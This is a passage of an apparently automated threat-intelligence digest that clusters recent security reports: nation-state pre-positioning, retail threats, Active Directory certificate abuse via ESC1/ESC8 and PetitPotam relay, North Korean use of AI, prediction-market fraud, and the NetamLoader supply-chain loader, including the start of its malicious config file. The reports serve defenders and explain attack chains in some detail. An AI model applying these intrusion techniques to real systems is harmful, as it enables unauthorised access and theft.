rush for AI has created… How many billions if not trillions that is going to cost companies that are already by normal forecasting methods “bankrupt”…
```

#### Corroborating sources (1)

- **Schneier on Security** (practitioner_analysis)
  - Title: AI Vulnerability Finding
  - Published: 2026-11-02T12:02:34+00:00
  - Link: https://www.schneier.com/blog/archives/2026/11/ai-vulnerability-finding-2.html
  - Summary: A comment : 3% of ‘critical’ software security bugs, in all of recorded history, have been found in the last month. This is on pace to find another ~100,000 bugs this year alone, adding ~26% more vulnerabilities to the all time total Do you realize how fucking insane that is? Yes. It is a new world out there.

### Cluster b9771fe2d2 — score 11

- Title: Targeting the Defense Industrial Base: What Network Telemetry Reveals About Nation-State Pre-Positioning
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-27T19:08:02+00:00
- Link: https://www.team-cymru.com/post/defense-industrial-base-nation-state-network-telemetry
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, supply_chain
- actor_attribution: Salt Typhoon, Volt Typhoon
- affected_industries: critical_infrastructure, manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain, apt_espionage
- actor_attribution: Volt Typhoon, Salt Typhoon
- affected_industries: critical_infrastructure, manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Discover how nation-states target the Defense Industrial Base via pre-positioning. Learn why network telemetry is crucial to detect these hidden cyber threats.
```

#### Full body

```
Stephen Campbell 5 min read April 29, 2026 Targeting the Defense Industrial Base: What Network Telemetry Reveals About Nation-State Pre-Positioning Intelligence drives operations. It provides commanders with options across time and space and enables them to shape the battlefield on their terms. This concept is not new. What has changed is the domain. Nation states are applying the same intelligence playbook in cyberspace, with the Defense Industrial Base as a primary target. What is being observed is not limited to intrusion activity, it is reconnaissance and pre positioning. Analysis of large-scale network telemetry reinforces this, showing sustained patterns of infrastructure mapping and access development long before disruptive activity occurs. In MITRE ATT&CK terms, this maps directly to reconnaissance and resource development. Adversaries are identifying targets, mapping infrastructure, and preparing access long before anything disruptive happens. Volt Typhoon is a clear example. They maintained access to US critical infrastructure for over five years before it was publicly disclosed. This is not an attack. It is intelligence preparation of the battlefield, carried out in cyberspace. Why the DIB is the Target The Defense Industrial Base is one of the most targeted sectors out there, and it is not just about stealing data. Yes, intellectual property matters. Weapons systems, propulsion, and communications technology are all high value targets. Stealing that information shortens the development and learning curve. It lets adversaries bypass years of research and development and move faster than they should be able to. But the real objective is access. If you can disrupt or degrade a supply chain at the right moment, that creates strategic impact. In a crisis, that is far more valuable than large volumes of stolen data. When most people think about the Defense Industrial Base, they picture large primes like Raytheon or Northrop Grumman. The reality is very different. Around 80 percent of the DIB is made up of small and mid-size contractors. These companies hold sensitive data. Contracts, technical specifications, and personnel information tied to clearances. But many of them are not resourced to defend at the same level as the primes. There is a mismatch between what they hold and what they can protect. That gap is what adversaries exploit. In military terms, you avoid the strongest point and look for the gap. The seam. The place where defenses are thin, and access still gets you where you need to go. In cyber, that seam is often a smaller contractor with real access and limited defenses. Four Actors, Four Approaches Understanding who is targeting the DIB and how they operate is key to building any effective defense. China operates with patience and persistence. Groups like Volt Typhoon and Salt Typhoon are not built for speed. They are built to remain hidden. Volt Typhoon relies heavily on living off the land techniques . That means using tools that already exist inside the environment, like PowerShell and WMI, instead of deploying custom malware. Nothing new gets dropped, nothing obvious gets flagged. Their activity blends into normal system operations, which makes detection extremely difficult. Salt Typhoon showed how far this approach can go . In 2024, they compromised the US Army National Guard network and maintained access for nine months. During that time, they collected network diagrams and administrator credentials. This is not random collection. It is deliberate. They are mapping the environment, understanding how it is built, and identifying where they can move next or come back later. It is about positioning, not immediate impact. Russia takes a more aggressive infrastructure-focused approach. GRU Unit 26165 has been exploiting vulnerable edge routers at scale. Instead of just gaining access to one network, they turn these devices into relay nodes. Traffic is redirected through attacker controlled DNS infrastruct
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Targeting the Defense Industrial Base: What Network Telemetry Reveals About Nation-State Pre-Positioning
  - Published: 2026-10-27T19:08:02+00:00
  - Link: https://www.team-cymru.com/post/defense-industrial-base-nation-state-network-telemetry
  - Summary: Discover how nation-states target the Defense Industrial Base via pre-positioning. Learn why network telemetry is crucial to detect these hidden cyber threats.

### Cluster 24d8131bb5 — score 11

- Title: Stopping Remote Code Execution with Sandboxes, CVE-2026-115995: Rust Zip
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-10-29T16:18:52+00:00
- Link: https://www.reddit.com/r/netsec/comments/1xiohqc/stopping_remote_code_execution_with_sandboxes/
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-115995

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- cve_ids: CVE-2026-115995
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- threat_categories: supply_chain
- cve_ids: CVE-2026-115995
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Summary

```
With AI platfforms, #vulnpocalypse, and supply chain attacks security teams and platform engineering teams heads are spinning. The two recent HIGH and CRITICAL CVEs in the rust zip make a great case study for how we can build more resilient, defendable, and secure platforms with Wasm Sandboxes: https://cosmonic.com/blog/stopping-remote-code-execution-with-a-sandbox/ submitted by /u/HectaMan [link] [comments]
```

#### Corroborating sources (1)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: Stopping Remote Code Execution with Sandboxes, CVE-2026-115995: Rust Zip
  - Published: 2026-10-29T16:18:52+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1xiohqc/stopping_remote_code_execution_with_sandboxes/
  - Summary: With AI platfforms, #vulnpocalypse, and supply chain attacks security teams and platform engineering teams heads are spinning. The two recent HIGH and CRITICAL CVEs in the rust zip make a great case study for how we can build more resilient, defendable, and secure platforms with Wasm Sandboxes: https://cosmonic.com/blog/stopping-remote-code-execution-with-a-sandbox/ submitted by /u/HectaMan [link] [comments]

### Cluster 4b77037fd4 — score 10

- Title: Unwrapping Retail Peak Season Cyber Threats
- Source: Unit 42 (threat_research_primary)
- Published: 2026-10-28T18:00:10+00:00
- Link: https://unit42.paloaltonetworks.com/unwrapping-retail-cyber-threats/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion, supply_chain, zero_day
- actor_attribution: BlackCat/ALPHV
- affected_industries: financial_services, retail_ecommerce
- affected_products: Salesforce, SolarWinds
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, zero_day
- actor_attribution: BlackCat/ALPHV
- affected_industries: financial_services, retail_ecommerce
- affected_products: Salesforce, SolarWinds
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Unit 42 explores key peak shopping season retail cyber threats, from ransomware to AI attacks, and shares how to defend operations and customer trust. The post Unwrapping Retail Peak Season Cyber Threats appeared first on Unit 42 .
```

#### Full body

```
Threat Research Center Insights Hospitality Hacks and Retail Reality Checks Hospitality Hacks and Retail Reality Checks Unwrapping Retail Peak Season Cyber Threats 6 min read Related Products Advanced Threat Prevention Advanced URL Filtering Cortex XDR Cortex Xpanse Cortex XSIAM Idira Next-Generation Firewall Prisma Access Unit 42 Continuous Frontier AI Defense Unit 42 Deep and Dark Web Service Unit 42 Incident Response By: Matt Brady Christa McHugh Published: October 28, 2026 Categories: Hospitality Hacks and Retail Reality Checks Insights Tags: Data exfiltration Frontier AI Retail Share Introduction During the 2025 peak holiday shopping season, the National Retail Federation predicted that retail sales would surpass $1 trillion USD for the first time, with Salesforce later reporting that online sales equated to $1.3 trillion globally. This included $294 billion in the United States and $262 billion influenced by AI and agents. Cybercriminals are highly aware that the holiday season is generally the most profitable for retailers, and look to capitalize on it for their own financial gain. This blog explores the main cyber threats that retail organizations need to be aware of and prepared to defend against as we approach peak shopping season in 2026. We highlight notable security events that occurred in prior years during this time period. We also examine relevant threats from both an enterprise and guest point of view and provide examples of the evolving trend of autonomous attacks that could impact retailers. Background Since 2020, there have been several notable security events disclosed toward the end of peak shopping season. This includes the SolarWinds software supply chain compromise in December 2020 and the exploitation of a Log4j zero-day vulnerability in December 2021. Both events posed complexities for retail security teams as they occurred during a period where code freezes were likely in place. This limited the ability for organizations to make changes to critical technology systems to prevent any operational disruption to core technology infrastructure. In addition to these broader threat landscape events, retailers typically face an increase in many types of financially-motivated attacks during this time period. This includes tactics and techniques designed to target both enterprises and guests alike. Based on years of previous activity against Fortune 100 retailers from cyber threats during peak shopping season, these are the types of attacks that retailers should be primarily focused on detecting and responding to this time of year. Enterprise-Focused Threats Ransomware Ransomware continues to pose a major risk for retail organizations heading into peak shopping season due to potential for operational disruption that could negatively impact the guest experience (in-store and online) and supply chain requirements (inventory). As of Sept. 30, 2026, ransomware operators have claimed 565 retail organizations as victims this year, with the median company revenue hovering around $22 million. The top three ransomware operators that claimed retail victims are TGR-CRI-1173 (aka The Gentlemen), Spikey Scorpius (aka Qilin) and Howling Scorpius (aka Akira). One example of a ransomware incident that impacted a retailer during peak shopping season occurred in December 2023, when Ambitious Scorpius (aka ALPHV) stole millions of customer records from a victim and caused significant operational disruption in terms of delayed order fulfillment, canceled e-commerce orders and slowed inventory replenishment. To mitigate ransomware risks that jeopardize uptime, retailers need to deploy automated containment mechanisms alongside robust network segmentation strategies. Security teams should: Leverage advanced endpoint protection featuring real-time behavioral analysis to rapidly isolate compromised assets Enforce zero trust access across the enterprise to limit lateral movement Utilize inline sandboxing capabilities to inspect suspic
```

#### Corroborating sources (1)

- **Unit 42** (threat_research_primary)
  - Title: Unwrapping Retail Peak Season Cyber Threats
  - Published: 2026-10-28T18:00:10+00:00
  - Link: https://unit42.paloaltonetworks.com/unwrapping-retail-cyber-threats/
  - Summary: Unit 42 explores key peak shopping season retail cyber threats, from ransomware to AI attacks, and shares how to defend operations and customer trust. The post Unwrapping Retail Peak Season Cyber Threats appeared first on Unit 42 .

### Cluster 618b08e33f — score 10

- Title: From help desk impersonation to AD CS abuse: Investigating ESC1 and ESC8 intrusion paths
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-10-30T16:11:44+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/10/30/help-desk-impersonation-ad-cs-abuse-investigating-esc1-esc8-intrusion-paths/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_products: Microsoft Defender, Microsoft Windows
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_products: Microsoft Defender, Microsoft Windows
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Teams support impersonation led to remote access, malicious runtime execution, and Certificate Services abuse through authentication relay and Kerberos. The post From help desk impersonation to AD CS abuse: Investigating ESC1 and ESC8 intrusion paths appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Content types Research Products and services Microsoft Defender Microsoft Defender for Endpoint Microsoft Defender for Identity Topics Actionable threat insights Threat intelligence Microsoft Threat Intelligence investigated two human-operated intrusions in which threat actors used Microsoft Teams messages and calls to impersonate IT or help desk personnel and socially engineer users into granting interactive remote access, primarily through Quick Assist. Once connected, the threat actors staged portable Python, Bun, or Java runtimes, performed host and network discovery, and assessed Active Directory Certificate Services (AD CS) for certificate-based authentication paths. Although the incidents began with the same social-engineering and remote-access pattern, they diverged at the certificate layer. In Case 1, the threat actor abused an Enterprise CA Security Configuration 1 (ESC1) -vulnerable certificate template to obtain authentication certificates for privileged accounts and performed DCSync. In Case 2, the threat actor used PetitPotam, a technique that causes a Windows server to authenticate to an attacker-controlled system. The attacker relayed the domain controller’s New Technology (NT) LAN Manager (NTLM) authentication to AD CS Web Enrollment (ESC8), obtained a certificate for the domain-controller account, and used it for certificate-based Kerberos authentication (PKINIT – Public Key Cryptography for Initial Authentication). This intrusion pattern is high impact because a user-approved remote session can become certificate-backed access to privileged identities and domain infrastructure. In Case 1, Microsoft Defender attack disruption restricted covered identities and blocked substantial follow-on activity, but a privileged identity excluded from automated containment remained usable and later supported data exfiltration. In Case 2, Defender generated ESC8-related alerts, after which the customer isolated the associated workstation and no further progression was observed. The activity did not exploit a vulnerability in Microsoft Teams; instead, it relied on social engineering and insecure or overly permissive AD CS configurations. In this blog, we analyze the shared attack chain, the ESC1 and ESC8 certificate-abuse paths, and the different response outcomes. We also provide investigation methods, mitigation recommendations, Microsoft Defender detection guidance, and advanced hunting queries to help defenders identify and interrupt this access path. The activity described here is not attributed to a specific threat actor. Activity overview Risk to enterprise environments AD CS can turn a certificate request into a durable authentication path. An attacker who obtains an authentication certificate for a privileged user or machine account can use that certificate independently of the initially compromised password. Resetting the user’s password or reimaging the first workstation does not revoke an issued certificate or invalidate Kerberos tickets that have already been issued. Two AD CS abuse techniques are central to these incidents: ESC1 – certificate template abuse: A low-privileged requester abuses a misconfigured authentication-capable template that permits requester-supplied identity information and broad enrollment, allowing the requester to obtain a certificate for a privileged account. ESC8 – NTLM relay to Web Enrollment: An attacker relays a user or machine account’s NTLM authentication to an AD CS web enrollment endpoint that lacks relay protections, then requests a certificate as the relayed identity. Attackers can use Microsoft Teams to impersonate IT support personnel and persuade users to approve a remote session, gaining hands-on-keyboard access without a conventional malware attachment. Portable or renamed runtimes such as Python, Bun, and Java can execute attacker-controlled scripts from user-writable locations while retaining legitimate file metadata. Automated disruption
```

#### Corroborating sources (2)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: From help desk impersonation to AD CS abuse: Investigating ESC1 and ESC8 intrusion paths
  - Published: 2026-10-30T16:11:44+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/10/30/help-desk-impersonation-ad-cs-abuse-investigating-esc1-esc8-intrusion-paths/
  - Summary: Teams support impersonation led to remote access, malicious runtime execution, and Certificate Services abuse through authentication relay and Kerberos. The post From help desk impersonation to AD CS abuse: Investigating ESC1 and ESC8 intrusion paths appeared first on Microsoft Security Blog .
- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: From help desk impersonation to AD CS abuse: Investigating ESC1 and ESC8 intrusion paths
  - Published: 2026-10-30T16:11:44+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/10/30/help-desk-impersonation-ad-cs-abuse-investigating-esc1-esc8-intrusion-paths/
  - Summary: Teams support impersonation led to remote access, malicious runtime execution, and Certificate Services abuse through authentication relay and Kerberos. The post From help desk impersonation to AD CS abuse: Investigating ESC1 and ESC8 intrusion paths appeared first on Microsoft Security Blog .

### Cluster d566b95cff — score 10

- Title: Tracking AI adoption in North Korean threat actor tradecraft
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-10-29T16:00:00+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/10/29/tracking-ai-adoption-in-north-korean-threat-actor-tradecraft/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_industries: education, financial_services, government
- affected_products: Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_industries: financial_services, government, education
- affected_products: Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
As Microsoft Threat Intelligence continues to track how threat actors operationalize AI to increase the speed and efficiency of attacks, we’ve identified North Korean threat actors expanding their use of AI with varying levels of adoption. This blog breaks down how North Korean threat actors are utilizing AI across their operations, reflecting a broader trend of threat actors incorporating AI into their attack chains. The post Tracking AI adoption in North Korean threat actor tradecraft appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Tags Sapphire Sleet Sleet Social engineering Threats intelligence AI threats Cyberattacker techniques, tools, and infrastructure Threat actors Content types Research Products and services Microsoft Defender Microsoft Defender for Office 365 Topics Threat intelligence As Microsoft Threat Intelligence continues to track how threat actors operationalize AI to increase the speed, efficiency, and complexity of attacks, we’ve identified North Korean threat actors expanding their use of AI with varying levels of adoption. Threat actors use AI as a force multiplier across their operations, particularly to accelerate and scale established workflows. Recent activities illustrate this AI-enabled acceleration and scaling: Jade Sleet launched campaigns through three front companies in a single week, Onyx Sleet generated dozens of tailored lures in minutes, Coral Sleet rapidly built a new capability to trojanize private source code repositories, and Diamond Sleet used AI to enhance tailored targeting workflows, including persona development and front company creation. Further, Onyx Sleet and Pearl Sleet are leveraging the open-source agentic AI penetration testing framework ARTEX to conduct operations, further indicating North Korea’s willingness to quickly adopt new AI technologies for their operations. The Democratic People’s Republic of Korea operates under extensive international sanctions and uses cyber operations and other illicit mechanisms to evade these restrictions and advance state objectives. Within this operating environment, North Korean threat actors have adopted new technologies that help sustain or advance existing operations. AI adoption by North Korean threat actors therefore largely supports existing goals and targeting priorities rather than representing a shift in actor motivations. North Korean threat actors conduct cyber operations primarily to generate revenue for the regime, collect strategic intelligence, and, in some cases, pursue politically motivated disruptive or destructive objectives. Across these objectives, North Korean threat actor tradecraft remains grounded in social engineering, malware delivery, and the abuse of legitimate tools. These operations commonly target cryptocurrency and financial organizations, information technology companies and software supply chains, government entities, and education-related organizations. Despite threat actors’ adoption of AI, Microsoft Threat Intelligence assesses that AI-enabled operations remain human-directed and have not become fully autonomous. Microsoft Threat Intelligence assesses the overall adoption of AI across North Korean threat actors as high, with threat actors such as Jade Sleet, Coral Sleet, and Jasper Sleet demonstrating an established use of AI across all operational workflows, alongside increasing adoption across the broader North Korean threat actor set. This blog breaks down how North Korean threat actors are utilizing AI across their operations, reflecting a broader trend of threat actors incorporating AI into their attack chains. We also provide mitigation guidance and Microsoft Defender detections to help organizations defend against these threats. Stages of AI adoption by North Korean threat actors North Korean threat actors are increasingly integrating generative and agentic AI platforms into their operations, but the rate and maturity of adoption vary. Based on identified AI use, Microsoft Threat Intelligence assesses high-impact North Korean threat actors across four stages of adoption: emerging, expanding, accelerating, and operationalized. Across these actors, AI use spans research, content generation, development, malware and tooling, infrastructure, and broader operational activities. Mapping high-impact North Korean threat actors by stages of AI adoption Operationalized: Threat actors at this stage have embedded AI into routine operational workflows, using it as an established part of their existing pro
```

#### Corroborating sources (2)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: Tracking AI adoption in North Korean threat actor tradecraft
  - Published: 2026-10-29T16:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/10/29/tracking-ai-adoption-in-north-korean-threat-actor-tradecraft/
  - Summary: As Microsoft Threat Intelligence continues to track how threat actors operationalize AI to increase the speed and efficiency of attacks, we’ve identified North Korean threat actors expanding their use of AI with varying levels of adoption. This blog breaks down how North Korean threat actors are utilizing AI across their operations, reflecting a broader trend of threat actors incorporating AI into their attack chains. The post Tracking AI adoption in North Korean threat actor tradecraft appeared first on Microsoft Security Blog .
- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: Tracking AI adoption in North Korean threat actor tradecraft
  - Published: 2026-10-29T16:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/10/29/tracking-ai-adoption-in-north-korean-threat-actor-tradecraft/
  - Summary: As Microsoft Threat Intelligence continues to track how threat actors operationalize AI to increase the speed and efficiency of attacks, we’ve identified North Korean threat actors expanding their use of AI with varying levels of adoption. This blog breaks down how North Korean threat actors are utilizing AI across their operations, reflecting a broader trend of threat actors incorporating AI into their attack chains. The post Tracking AI adoption in North Korean threat actor tradecraft appeared first on Microsoft Security Blog .

### Cluster 18297eee95 — score 10

- Title: Prediction Markets Emerge as a New Vertical for Traffer Teams
- Source: Recorded Future (threat_research_primary)
- Published: 2026-10-29T00:00:00+00:00
- Link: https://www.recordedfuture.com/research/prediction-markets-traffer-teams
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_industries: financial_services, manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_industries: financial_services, manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Discover how Russian traffer teams use turnkey fraud infrastructure to exploit prediction markets.
```

#### Full body

```
Prediction Markets Emerge as a New Vertical for Traffer Teams Executive Summary Since the spring of 2026, Insikt Group has observed multiple Russian-language traffer teams that have quickly adapted affiliate-fraud models to capitalize on growing public interest in prediction markets such as PolyMarket and Kalshi. The platforms offered by three such teams — AtlasCore, PolyFucked, and Magnetic Team — provide websites, administrative panels, cryptocurrency payment infrastructure, victim-management capabilities, technical support, and promotional guidance. This model lowers barriers to entry for affiliates and enables campaigns to scale rapidly as new trends attract potential victims. The services combine convincing prediction-market interfaces with established fraud mechanisms designed to manipulate victims and prevent them from recovering deposited funds. These mechanisms include controlled trading outcomes, fabricated market activity, artificial withdrawal restrictions and fees, and the collection of sensitive identity and payment information. Artificial intelligence (AI) further accelerates this opportunism by reducing the time, cost, and expertise required to adapt campaigns to emerging events. Insikt Group observed threat actors using AI to support multiple stages of their campaigns, including platform development, content creation, social engineering, and victim engagement. The rapid adoption of prediction markets by multiple traffer teams illustrates a broader threat from mature fraud ecosystems that can pivot toward emerging technologies, financial products, and cultural trends without having to develop entirely new criminal capabilities. Prediction markets are particularly well-suited to this model because legitimate platforms already combine cryptocurrency, speculative financial activity, rapidly changing news events, and social media discussion. Fraud actors can imitate these characteristics to establish credibility and manufacture urgency. As the fraudulent prediction markets gain visibility, additional traffer teams may experiment with the prediction market theme or reuse the underlying tooling for adjacent fraud schemes. Key Findings AtlasCore, PolyFucked, and Magnetic Team supply affiliates with simulated prediction-market websites, administrative panels, payment infrastructure, and promotional support. Advertised compensation includes 70% to 80% of net profits for AtlasCore affiliates, a minimum 60% revenue share for PolyFucked affiliates, and a base 70% share of victim deposits for Magnetic Team affiliates. AtlasCore’s Telegram posts recorded approximately $10.97 million in claimed deposits across its scam offerings between May 2 and September 18, 2026, with the deposits predominantly associated with prediction markets. PolyFucked separately advertises approximately $2.4 million in quarterly turnover. Both figures rely on threat actor reporting and remain unverified. Magnetic Team advertises more than 3,000 simulated traders across more than 5,000 markets to fabricate convincing trading activity. Its code exposes configurable withdrawal-blocking pretexts, forced-loss controls, and pools of up to 20,000 deposit wallets per blockchain. AtlasCore similarly exposes settings to force wins or losses and impose individualized withdrawal restrictions. All three traffer teams advertise or provide AI-assisted victim support. AtlasCore and PolyFucked also supply guidance for AI-generated promotional content, including synthetic influencers and branding, respectively. Magnetic Team’s source code contains indicators of likely AI-assisted development, suggesting AI use may extend to building and maintaining the underlying fraud platforms, although that assessment remains unconfirmed. Insikt Group identified over 100 unique domains and subdomains associated with AtlasCore, PolyFucked, and Magnetic Team, including administrative infrastructure and scam websites likely operated by the teams or their affiliates. Threat Analysis At
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: Prediction Markets Emerge as a New Vertical for Traffer Teams
  - Published: 2026-10-29T00:00:00+00:00
  - Link: https://www.recordedfuture.com/research/prediction-markets-traffer-teams
  - Summary: Discover how Russian traffer teams use turnkey fraud infrastructure to exploit prediction markets.

### Cluster 364a564664 — score 10

- Title: Unknown APT uses NetamLoader to attack a Win10 OS customized for governments in Asia
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-10-29T08:00:15+00:00
- Link: https://securelist.com/netamloader/121676/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, supply_chain
- affected_industries: government
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: supply_chain, apt_espionage
- affected_industries: government
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Kaspersky researchers analyze a complex targeted attack employing NetamLoader, a sophisticated malicious framework and targeting a customized government OS.
```

#### Full body

```
Table of Contents Introduction Background Initial infection Stage 1 Step 1 Step 2 Step 3 Stage 2 XAML-2-1 XAML-2-2 .NET 1 Loader XAML-3 .NET 2 Plugin AES encryption scheme for network traffic Discovering proxies Execute downloaded XAML payload in an isolated AppDomain Infrastructure Victims Attribution Conclusions Indicators of Compromise File hashes File paths Domains and IPs Authors GReAT Introduction A couple of months ago, our research revealed a highly sophisticated infection chain and a complex .NET assembly-loading framework built on XAML markup, which strongly indicates a supply-chain attack targeting a custom Windows build used exclusively by government entities in Asia. The malicious framework has been labeled NetamLoader; at present, no attribution to any known APT group has been established. The sample came to light in the first half of 2026, when Kaspersky Security Network (KSN) issued a malware detection alert for a .config file using AppDomainManager injection to load arbitrary .NET assemblies. The file was packaged inside a CAB archive placed in the directory that stores Windows operating system update packages. Initial analysis of the CAB contents found no malicious code: most executables were legitimate components of the third-party patch management tool Patch My PC, and even the .NET assemblies used for the injection were Microsoft-signed. A later re-examination of the original .config file and the full loading process revealed the infection chain and framework described in this report. Kaspersky’s products detect this threat as HEUR:Trojan.MSIL.NetamLoader.gen, Trojan.MSIL.Zapchast.*, and Trojan.Script.Agent.*. Background During routine threat hunting, KSN sent us a malware detection alert. The notification flagged a .config file that employed AppDomainManager injection to load arbitrary .NET assemblies. The file was compressed into a CAB archive named e4537a1762fcafd2fd96bfc825bad34f9db9a24d and saved in the folder that stores Windows operating system update packages. Below is the full path to this archive: C:\Windows\SoftwareDistribution\Download\e4537a1762fcafd2fd96bfc825bad34f9db9a24d 1 C : \ Windows \ SoftwareDistribution \ Download \ e4537a1762fcafd2fd96bfc825bad34f9db9a24d Starting with this CAB archive, we uncovered a highly complex infection chain that uses a previously unknown advanced loading framework. Initial infection The CAB file contains the following seven files, which are extracted and placed in the path C:\Windows\SoftwareDistribution\Download\Install\: Files compressed in the CAB file Except for Resources.resx, none of the files contain malicious code. We did not observe how the CAB file was delivered to the victim; we only saw the process PatchMyPC-ScriptRunner.exe running with the following arguments: C:\Windows\SoftwareDistribution\Download\Install\PatchMyPC-ScriptRunner.exe -updatepackage -applicationid=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx 1 C : \ Windows \ SoftwareDistribution \ Download \ Install \ PatchMyPC - ScriptRunner . exe - updatepackage - applicationid = xxxxxxxx - xxxx - xxxx - xxxx - xxxxxxxxxxxx After the file is launched in this manner, the infection chain progresses to stage 1. Stage 1 Starting with the execution of PatchMyPC-ScriptRunner.exe, which then served as a host process for loading several payloads, we identified a complex two‑stage loading mechanism with multiple steps. The overall flow of stage 1 is summarized in the diagram below. Infection chain: Stage 1 Step 1 The AppDomainManager injection technique is used to load an arbitrary .NET assembly. With this mechanism, when PatchMyPC-ScriptRunner.exe runs, the accompanying configuration file PatchMyPC-ScriptRunner.exe.config in the same directory is loaded before the executable’s main function runs. Below is the content of PatchMyPC‑ScriptRunner.exe.config. <?xml version="1.0" encoding="utf-8" ?> <configuration> <runtime> <appDomainManagerType value="Microsoft.ApplicationServer.Caching.DataCacheFactoryConfigur
```

#### Corroborating sources (1)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: Unknown APT uses NetamLoader to attack a Win10 OS customized for governments in Asia
  - Published: 2026-10-29T08:00:15+00:00
  - Link: https://securelist.com/netamloader/121676/
  - Summary: Kaspersky researchers analyze a complex targeted attack employing NetamLoader, a sophisticated malicious framework and targeting a customized government OS.

### Cluster 3f95e8e04b — score 10

- Title: This month in security with Tony Anscombe – October 2026 edition
- Source: ESET WeLiveSecurity (threat_research_primary)
- Published: 2026-10-30T15:03:14+00:00
- Link: https://www.welivesecurity.com/en/videos/month-security-tony-anscombe-october-2026/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: data_breach
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
The PHP2Shell disclosure and other major cybersecurity news this month brought into relief the need for well-thought-out cyber-readiness plans
```

#### Full body

```
Video This month in security with Tony Anscombe – October 2026 edition The PHP2Shell disclosure and other major cybersecurity news this month brought into relief the need for well-thought-out cyber-readiness plans Editor 30 Oct 2026 With October coming to a close, ESET Chief Security Evangelist Tony Anscombe reviews some of the top cybersecurity stories that made the news over the month. At the same time, he offers insights that the latest wave of incidents hold for your company's, or your own, cyber-defenses. Here's Tony's rundown of some of what stood out most in October: Over the past ten days, the cybersecurity news cycle has been dominated by two critical vulnerabilities in PHP, a server-side scripting language powering some 70 percent of websites globally. Here's what you should know more about the pair of flaws known as PHP2Shell, as well as related topics – and we also dived into the issues in this video and this blog post . Cyberattackers broke into refrigeration controllers at up to 700 French supermarkets and raised the temperature of refrigerators and freezers to as high as 50 degrees Celsius. A data breach at Denmark’s Central Population Register (CPR) has exposed the personal information of 8.8 million people. The person claiming responsibility for the hack claims to have gained access through a third-party provider's account that was 'protected' by the password ‘123456’. Malware preinstalled on thousands of cheap Android phones that can generate fraudulent ad revenue and potentially turn infected devices into parts of larger botnets – a problem that we also wrote about a while back. What are the lessons that businesses should take away from the latest cybersecurity news? Watch Tony's video to find out, and be sure to check out the September 2026 edition of his monthly security news roundup for more insights. Connect with us on Facebook , X , LinkedIn and Instagram . Let us keep you up to date Sign up for our newsletters Related Articles Video PHP2Shell: What to know about two critical PHP flaws Video PHP2Shell: What to know about two critical PHP flaws Video This month in security with Tony Anscombe – September 2026 edition Video This month in security with Tony Anscombe – September 2026 edition Video This month in security with Tony Anscombe – August 2026 edition Video This month in security with Tony Anscombe – August 2026 edition Similar Articles Video 